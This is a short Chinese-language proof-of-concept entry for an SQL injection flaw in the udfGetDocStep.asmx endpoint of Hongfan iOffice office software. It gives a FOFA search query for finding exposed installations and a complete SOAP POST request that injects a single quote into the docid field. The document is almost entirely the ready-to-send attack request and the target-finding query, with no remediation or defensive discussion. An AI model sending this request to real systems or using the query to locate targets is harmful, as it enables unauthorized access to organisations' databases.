## 红帆ioffice-udfGetDocStep.asmx存在SQL注入漏洞

## fofa

```
app="红帆-ioffice"
```

## POC

```
POST /ioffice/prg/interface/udfGetDocStep.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/GetDocStep"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
    <GetDocStep xmlns="http://tempuri.org/">
        <docid>1'</docid>
    </GetDocStep>
    </soap:Body>
</soap:Envelope>
```
